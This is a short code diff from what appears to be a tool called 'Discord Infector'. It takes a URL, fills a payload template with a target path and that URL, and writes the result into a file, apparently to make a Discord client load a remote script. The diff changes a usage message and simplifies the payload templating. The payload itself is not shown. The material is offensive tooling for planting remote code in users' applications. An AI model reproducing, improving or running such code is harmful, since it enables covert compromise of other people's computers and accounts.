@@ -63,7 +63,7 @@ const assertPath = path=>{
 const assertArguments = num=>{
 	if(process.argv.length < num){
 		console.error(`Discord Infector must be run with a URL to pull a script from.`);
-		console.error(`Example: .\\discordinfector.exe https://example.org/examplescript.js`);
+		console.error(`Example: .\\DiscordInfector.exe https://example.org/examplescript.js`);
 		return false;
 	}
 	return true;
@@ -76,10 +76,7 @@ const assertArguments = num=>{
  * */
 const dropScript = async (path,payloadPath,url)=>{
 	const updatedPath = fillTemplate(payloadPath,'\\','/');
-	let payloadData = String(payload);
-	payloadData = payloadData.substring(10,payloadData.length-1);
-	const updatedPayload = fillTemplate(fillTemplate(payloadData,'#path',updatedPath),'#url',url);
-	console.log(updatedPayload);
+	const updatedPayload = fillTemplate(fillTemplate(payload,'#path',updatedPath),'#url',url);
 	try{
 		fs.writeFileSync(path,updatedPayload);
 		return true;
